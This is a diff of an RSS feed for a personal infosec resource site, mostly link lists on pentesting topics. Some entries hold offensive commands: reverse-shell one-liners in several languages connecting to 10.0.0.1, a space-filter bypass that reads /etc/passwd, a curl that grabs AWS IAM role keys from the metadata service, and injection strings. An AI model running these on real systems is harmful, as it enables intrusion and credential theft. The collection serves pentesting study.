@@ -1,11 +1,11 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>Infosec on d47zm3</title>
     <link>https://d47zm3.me/resources/infosec/</link>
     <description>Recent content in Infosec on d47zm3</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en</language>
+    <language>en-us</language>
     
 	<atom:link href="https://d47zm3.me/resources/infosec/index.xml" rel="self" type="application/rss+xml" />
     
@@ -16,7 +16,7 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/blogs/</guid>
-      <description> Blogs worth reading.
+      <description>Blogs worth reading.
 Links  https://rastamouse.me - hacking Windows  </description>
     </item>
     
@@ -27,8 +27,13 @@ Links  https://rastamouse.me - hacking Windows  </description>
       
       <guid>https://d47zm3.me/resources/infosec/bugbounty/</guid>
       <description>Communities Bug Bounty Notes - founded by zseano, challenges, writeups, etc.
-Blogs  zseano blog with tutorials  Bug Bounty Tips  ### Files To Look Out For - .git/config - .travis.yml - Makefile - Dockerfile - package.json - gulpfile.js - composer.json - web.config - .env ### Need execute some command but &amp;#34;space&amp;#34; is blocked? Try with:  IFS=,;cat&amp;lt;&amp;lt;&amp;lt;cat,/etc/passwd cat$IFS/etc/passwd cat${IFS}/etc/passwd cat&amp;lt;/etc/passwd
-{cat,/etc/passwd} OR {ls,-las,/var} with args X=$&amp;lsquo;cat\x20/etc/passwd&amp;rsquo;&amp;amp;&amp;amp;$X ```</description>
+Blogs  zseano blog with tutorials  Bug Bounty Tips  nmap --script &amp;quot;http-*&amp;quot; IP/target - will run 30+ scripts related to HTTP, SQLInjection, config backup checks, checkout more at the docs http://nmap.org/nsedoc  Files To Look Out For   .git/config
+  .travis.yml
+  Makefile
+  Dockerfile
+  package.json
+  gulpfile.js
+  composer.</description>
     </item>
     
     <item>
@@ -37,7 +42,7 @@ Blogs  zseano blog with tutorials  Bug Bounty Tips  ### Files To Look Out For - 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/burp-suite-proxy/</guid>
-      <description> Famous tool for Web Application Security.
+      <description>Famous tool for Web Application Security.
 Links  Burp Suite Pro Tricks &amp;amp; Tips  </description>
     </item>
     
@@ -48,14 +53,13 @@ Links  Burp Suite Pro Tricks &amp;amp; Tips  </description>
       
       <guid>https://d47zm3.me/resources/infosec/cloud-security/</guid>
       <description>Grab IAM Role Keys - AWS curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ Security Audit Tools  ScoutSuite  All-In-One Wiki for Cloud Penetration Testing Source: https://www.peerlyst.com/posts/all-in-one-wiki-for-cloud-penetration-testing-nitesh-malviya
- Links and Resources for Cloud basics
- Introduction to Cloud Computing - https://www.gracefulsecurity.com/an-introduction-to-cloud-computing/
- SANS - https://pen-testing.sans.org/blog/2012/07/05/pen-testing-in-the-cloud
-  AWS Official Guide for permission and Penetration Testing - https://aws.amazon.com/security/penetration-testing/
- Links and Resources for AWS Pentesting
- https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-aws/
- https://www.provensec.com/penetration-testing-aws-s3-bucket/
- Rhinosecuritylabs links - https://rhinosecuritylabs.com/blog/?category=aws - check all the links.</description>
+  Links and Resources for Cloud basics
+  Introduction to Cloud Computing - https://www.gracefulsecurity.com/an-introduction-to-cloud-computing/
+  SANS - https://pen-testing.sans.org/blog/2012/07/05/pen-testing-in-the-cloud
+    AWS Official Guide for permission and Penetration Testing - https://aws.amazon.com/security/penetration-testing/
+  Links and Resources for AWS Pentesting
+  https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-aws/
+  https://www.</description>
     </item>
     
     <item>
@@ -64,7 +68,7 @@ Links  Burp Suite Pro Tricks &amp;amp; Tips  </description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/conference-video-archives/</guid>
-      <description> Great site with archived content from various conferences around the world, as well as podcasts and documents.
+      <description>Great site with archived content from various conferences around the world, as well as podcasts and documents.
 Links  InfoCon  </description>
     </item>
     
@@ -74,7 +78,7 @@ Links  InfoCon  </description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/cryptography/</guid>
-      <description> Courses  Introduction to Cryptography by Christof Paar  </description>
+      <description>Courses  Introduction to Cryptography by Christof Paar  </description>
     </item>
     
     <item>
@@ -83,7 +87,7 @@ Links  InfoCon  </description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/ctfs/</guid>
-      <description> Links  https://github.com/ctfs/ - lots of writeups  </description>
+      <description>Links  https://github.com/ctfs/ - lots of writeups  </description>
     </item>
     
     <item>
@@ -92,7 +96,7 @@ Links  InfoCon  </description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/exploits/</guid>
-      <description> Write-ups and such of more famous exploits.
+      <description>Write-ups and such of more famous exploits.
 dity_sock  https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html  runc - cve-2019-5736  https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html  </description>
     </item>
     
@@ -102,7 +106,7 @@ dity_sock  https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html  runc - cve-201
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/google-dorks/</guid>
-      <description> Links  500 pages PDF of dorks  Dorks  https://www.google.com/search?q=db_password+filetype%3Aenv - env files  </description>
+      <description>Links  500 pages PDF of dorks  Dorks  https://www.google.com/search?q=db_password+filetype%3Aenv - env files  </description>
     </item>
     
     <item>
@@ -111,16 +115,16 @@ dity_sock  https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html  runc - cve-201
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/hacking-learning-platforms/</guid>
-      <description> Things you can hack for (free) &amp;amp; legally
-Online Labs  Hack The Box
- Hacking Lab
- Pwnable.KR
- Root-Me
- Practical Pentest Labs
- Rozwal.To
+      <description>Things you can hack for (free) &amp;amp; legally
+Online Labs   Hack The Box
+  Hacking Lab
+  Pwnable.KR
+  Root-Me
+  Practical Pentest Labs
+  Rozwal.To
   Vulnerable Applications To Deploy Yourself] OWASP Juice Shop
-Miscellaneous  Mind Map - lots of links
- List of Hacking - source: https://www.blackroomsec.com/updated-hacking-challenge-site-links/
+Miscellaneous   Mind Map - lots of links
+  List of Hacking - source: https://www.blackroomsec.com/updated-hacking-challenge-site-links/
   </description>
     </item>
     
@@ -140,9 +144,9 @@ select sys_exec(&amp;#39;whoami&amp;#39;); Find SUID programs and abuse them fin
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/mobile-pentesting/</guid>
-      <description> Breaking security on phones.
-Sites  Hot and fresh guide from OWASP for iOS and Android available here.
- iOS App Security, Penetration Testing, and Development - nice blog on iOS security
+      <description>Breaking security on phones.
+Sites   Hot and fresh guide from OWASP for iOS and Android available here.
+  iOS App Security, Penetration Testing, and Development - nice blog on iOS security
   </description>
     </item>
     
@@ -162,9 +166,9 @@ MongoDB injections true, $where: &amp;#39;1 == 1&amp;#39; , $where: &amp;#39;1 =
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/online-courses/</guid>
-      <description> Google Docs Sheet with lots of links
- The Big List Of Infosec Resources
- NetSecFocus Resources
+      <description>  Google Docs Sheet with lots of links
+  The Big List Of Infosec Resources
+  NetSecFocus Resources
   </description>
     </item>
     
@@ -174,11 +178,11 @@ MongoDB injections true, $where: &amp;#39;1 == 1&amp;#39; , $where: &amp;#39;1 =
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/open-redirects/</guid>
-      <description> Same Open Redirect vulnerability won&amp;rsquo;t make it.
-Links  Open URL redirects to grab FB OAuth Tokens
- Full Account Takeover via Referer Header (OAuth token Steal, Open Redirect Vulnerability Chaining)
- Open Redirect on central.uber.com allows for account takeover
- hackerone.com/reports/206591
+      <description>Same Open Redirect vulnerability won&amp;rsquo;t make it.
+Links   Open URL redirects to grab FB OAuth Tokens
+  Full Account Takeover via Referer Header (OAuth token Steal, Open Redirect Vulnerability Chaining)
+  Open Redirect on central.uber.com allows for account takeover
+  hackerone.com/reports/206591
   </description>
     </item>
     
@@ -188,18 +192,18 @@ Links  Open URL redirects to grab FB OAuth Tokens
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/osint/</guid>
-      <description> Everything related to Open Source Intelligence.
-Search Engines  censys
- shodan
- greynoise
- zoomeye
- grayhatwarfare
- hunter.io
- binaryedge
- crt.sh
- dnsdumpster
- onyphe.io
- fofa.so
+      <description>Everything related to Open Source Intelligence.
+Search Engines   censys
+  shodan
+  greynoise
+  zoomeye
+  grayhatwarfare
+  hunter.io
+  binaryedge
+  crt.sh
+  dnsdumpster
+  onyphe.io
+  fofa.so
   </description>
     </item>
     
@@ -219,15 +223,15 @@ Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profil
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/passwords/</guid>
-      <description> Password Search Engines  gotcha.pw
- haveibeenpwned.com
- vigilante.pw
-  Wordlists and Weak Password  https://github.com/berzerk0/Probable-Wordlists
- https://github.com/danielmiessler/SecLists
- https://hashes.org
- https://weakpass.com
-  Cracking Hashes Online  https://crackstation.net
- https://hashkiller.co.uk/md5-decrypter.aspx
+      <description>Password Search Engines   gotcha.pw
+  haveibeenpwned.com
+  vigilante.pw
+  Wordlists and Weak Password   https://github.com/berzerk0/Probable-Wordlists
+  https://github.com/danielmiessler/SecLists
+  https://hashes.org
+  https://weakpass.com
+  Cracking Hashes Online   https://crackstation.net
+  https://hashkiller.co.uk/md5-decrypter.aspx
   </description>
     </item>
     
@@ -237,7 +241,7 @@ Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profil
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/payloads/</guid>
-      <description> Links  payload collections  </description>
+      <description>Links  payload collections  </description>
     </item>
     
     <item>
@@ -246,8 +250,8 @@ Stage 1: decrypt cookie root@bethebeast: ~ » padbuster http://hacker.com/profil
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/hacking-lab/</guid>
-      <description> https://cyberx.tech/hacking-lab/
- https://scriptdotsh.com/index.php/2018/06/09/active-directory-penetration-dojo-setup-of-ad-penetration-lab-part-1/
+      <description>  https://cyberx.tech/hacking-lab/
+  https://scriptdotsh.com/index.php/2018/06/09/active-directory-penetration-dojo-setup-of-ad-penetration-lab-part-1/
   </description>
     </item>
     
@@ -272,13 +276,12 @@ Protect Yourself @StartPageSearch @MyStartMail @DuckDuckGo @ProtonMail
       
       <guid>https://d47zm3.me/resources/infosec/reconnaissance/</guid>
       <description>Everything from port scanning, to service mapping, passive OSINT etc.
-Presentations  Recon Like a Boss
- Visual Guide to Recon
-  Links  Assesments Mindset
- DNS/Web Enumeration Reference
- Basic Recon - Guide
-  Subdomain Discovery  &#39; -f2 | cut -d &#39;&#39; -f2 | cut -d &#39;### DNS Checking who can issue certificate for domain  dig @nameserver record.com CAA
-GeoIP Lookup geoiplookup 1.2.3.4</description>
+Presentations   Recon Like a Boss
+  Visual Guide to Recon
+  Links   Assesments Mindset
+  DNS/Web Enumeration Reference
+  Basic Recon - Guide
+  Subdomain Discovery  curl &#39;https://crt.sh/?q=%.example.org&#39; | grep &amp;quot;http://example.org &amp;quot; | cut -d &#39;&amp;gt;&#39; -f2 | cut -d &#39;&amp;lt;&#39; -f1 | grep -v &amp;quot; &amp;quot; | sort -u  DNS Checking who can issue certificate for domain</description>
     </item>
     
     <item>
@@ -287,7 +290,7 @@ GeoIP Lookup geoiplookup 1.2.3.4</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/redteam/</guid>
-      <description> Articles  Obfuscation Techniques used in Phishing Attacks  </description>
+      <description>Articles  Obfuscation Techniques used in Phishing Attacks  </description>
     </item>
     
     <item>
@@ -296,12 +299,12 @@ GeoIP Lookup geoiplookup 1.2.3.4</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/reverse-engineering/</guid>
-      <description> Challenges  https://crackmes.one
- https://challenges.re
-   Training  https://recon.cx/2015/training.html
- http://index-of.es
- https://github.com/wtsxDev/reverse-engineering
- intro to ctf reverse engineering
+      <description>Challenges   https://crackmes.one
+  https://challenges.re
+   Training   https://recon.cx/2015/training.html
+  http://index-of.es
+  https://github.com/wtsxDev/reverse-engineering
+  intro to ctf reverse engineering
   </description>
     </item>
     
@@ -312,7 +315,7 @@ GeoIP Lookup geoiplookup 1.2.3.4</description>
       
       <guid>https://d47zm3.me/resources/infosec/reverse-shells/</guid>
       <description>Reverse shells in various languages/platforms.
-# bash bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1 # perl perl -e &amp;#39;use Socket;$i=&amp;#34;10.0.0.1&amp;#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39; # python python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.0.0.1&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; # php php -r &amp;#39;$sock=fsockopen(&amp;#34;10.0.0.1&amp;#34;,1234);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39; # ruby ruby -rsocket -e&amp;#39;f=TCPSocket.open(&amp;#34;10.0.0.1&amp;#34;,1234).to_i;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,f,f,f)&amp;#39; # netcat nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f # java r = Runtime.getRuntime() p = r.</description>
+# bash bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1 # perl perl -e &amp;#39;use Socket;$i=&amp;#34;10.0.0.1&amp;#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);};&amp;#39; # python python -c &amp;#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;#34;10.0.0.1&amp;#34;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;#34;/bin/sh&amp;#34;,&amp;#34;-i&amp;#34;]);&amp;#39; # php php -r &amp;#39;$sock=fsockopen(&amp;#34;10.0.0.1&amp;#34;,1234);exec(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;#34;);&amp;#39; # ruby ruby -rsocket -e&amp;#39;f=TCPSocket.open(&amp;#34;10.0.0.1&amp;#34;,1234).to_i;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,f,f,f)&amp;#39; # netcat nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.0.0.1 1234 &amp;gt;/tmp/f # java r = Runtime.getRuntime() p = r.exec([&amp;#34;/bin/bash&amp;#34;,&amp;#34;-c&amp;#34;,&amp;#34;exec 5&amp;lt;&amp;gt;/dev/tcp/10.</description>
     </item>
     
     <item>
@@ -323,9 +326,9 @@ GeoIP Lookup geoiplookup 1.2.3.4</description>
       <guid>https://d47zm3.me/resources/infosec/secrets-dumping/</guid>
       <description>Hunt for secret in repositories/source code/disk.
 GitHub Secret Leaks:
- https://github.com/zricethezav/gitleaks
- https://github.com/anshumanbh/git-all-secrets
- https://github.com/Hell0W0rld0/Github-Hunter
+  https://github.com/zricethezav/gitleaks
+  https://github.com/anshumanbh/git-all-secrets
+  https://github.com/Hell0W0rld0/Github-Hunter
   </description>
     </item>
     
@@ -335,7 +338,7 @@ GitHub Secret Leaks:
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/serverless/</guid>
-      <description> Links  Serverless Toolkit For Pentesters  </description>
+      <description>Links  Serverless Toolkit For Pentesters  </description>
     </item>
     
     <item>
@@ -344,7 +347,7 @@ GitHub Secret Leaks:
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/social-engineering/</guid>
-      <description> Also known as human hacking.
+      <description>Also known as human hacking.
 Links  SE Basics  </description>
     </item>
     
@@ -354,17 +357,17 @@ Links  SE Basics  </description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/static-code-analysis/</guid>
-      <description> Performing static code analysis in order to find weak points.
-Articles  great article from @bl4de on that subject
- another article from AppSecco
-  Tools  relative-url-extractor
- waybackurls
- trufflehog
- eslint + security rules (node for example or angular)
- linkfinder
- nodejsscan
- retire.js
- awesome-static-analysis
+      <description>Performing static code analysis in order to find weak points.
+Articles   great article from @bl4de on that subject
+  another article from AppSecco
+  Tools   relative-url-extractor
+  waybackurls
+  trufflehog
+  eslint + security rules (node for example or angular)
+  linkfinder
+  nodejsscan
+  retire.js
+  awesome-static-analysis
   </description>
     </item>
     
@@ -385,12 +388,12 @@ rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch key
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/windows-privilege-escalation/</guid>
-      <description>Windows Exploit/OS Reference Scripts  JAWS Sherlock Powerup Google Windows Version for common exploits  Links  PE Methods for Pentesters
- Level Up! Practical Windows Privilege Escalation - Andrew Smith
- Windows Privilege Escalation Guide
- Practical Usage of NTLM Hashes
- AD Security Blog
- Dumping Windows Credentials
+      <description>Windows Exploit/OS Reference Scripts  JAWS Sherlock Powerup Google Windows Version for common exploits  Links   PE Methods for Pentesters
+  Level Up! Practical Windows Privilege Escalation - Andrew Smith
+  Windows Privilege Escalation Guide
+  Practical Usage of NTLM Hashes
+  AD Security Blog
+  Dumping Windows Credentials
   Kernel Exploits  systeminfo -&amp;gt; look up missing kb&amp;rsquo;s systeminfo | findstr /B /C:&amp;ldquo;OS Name&amp;rdquo; /C:&amp;ldquo;OS * Version&amp;rdquo; sherlock -&amp;gt; Find-AllVulns powershell  Common Kernel Exploits  MS16-014 - applies to: Windows 7 SP1 x86 MS16-016 - &amp;lsquo;WebDAV&amp;rsquo; applies to Windows 7 SP1 x86 (Build 7601) MS16-032 - applies to: Windows 7 x86/x64, Windows 8 x86/64, Windows 10, Windows Server 2008-2012 R2  Config Files Credentials in ClearText or Base64 -&amp;gt; once Windows in installed</description>
     </item>
     
@@ -400,8 +403,8 @@ rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch key
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/wpa-wpa-2-security/</guid>
-      <description> Articles  new attack using pmkid
- pwning wpa/wpa2 networks with bettercap and the pmkid client-less attack
+      <description>Articles   new attack using pmkid
+  pwning wpa/wpa2 networks with bettercap and the pmkid client-less attack
   </description>
     </item>
     
@@ -412,10 +415,10 @@ rdesktop -uname -peasypassword -r disk:share=exploits/ 10.2.2.1 etcd - fetch key
       
       <guid>https://d47zm3.me/resources/infosec/xss/</guid>
       <description>Everything related to XSS, tools, links, payloads, etc.
-Tools  ezXSS - self hosted dashboard and server for your payloads
- bXSS - blind XSS application, had not played with it yet
-  Sites  XSS Payloads - site with JavaScript code that can actually hurt, keyloggers, data stealing etc.
- XSS Hunter - site that helps you by serving prepared scripts and generates some basic payloads, helps finding blind injections.</description>
+Tools   ezXSS - self hosted dashboard and server for your payloads
+  bXSS - blind XSS application, had not played with it yet
+  Sites   XSS Payloads - site with JavaScript code that can actually hurt, keyloggers, data stealing etc.
+  XSS Hunter - site that helps you by serving prepared scripts and generates some basic payloads, helps finding blind injections.</description>
     </item>
     
     <item>
@@ -424,15 +427,15 @@ Tools  ezXSS - self hosted dashboard and server for your payloads
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>https://d47zm3.me/resources/infosec/xxe/</guid>
-      <description> XML External Entity resources.
-Links  https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html
- https://github.com/enjoiz/XXEinjector
- https://github.com/staaldraad/xxeserv
- https://github.com/BuffaloWill/oxml_xxe
- https://github.com/GDSSecurity/xxe-recursive-download
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection
- https://isc.sans.edu/diary/Blindly+confirming+XXE/19257
- https://vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf
+      <description>XML External Entity resources.
+Links   https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html
+  https://github.com/enjoiz/XXEinjector
+  https://github.com/staaldraad/xxeserv
+  https://github.com/BuffaloWill/oxml_xxe
+  https://github.com/GDSSecurity/xxe-recursive-download
+  https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection
+  https://isc.sans.edu/diary/Blindly+confirming+XXE/19257
+  https://vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf
   </description>
     </item>
     
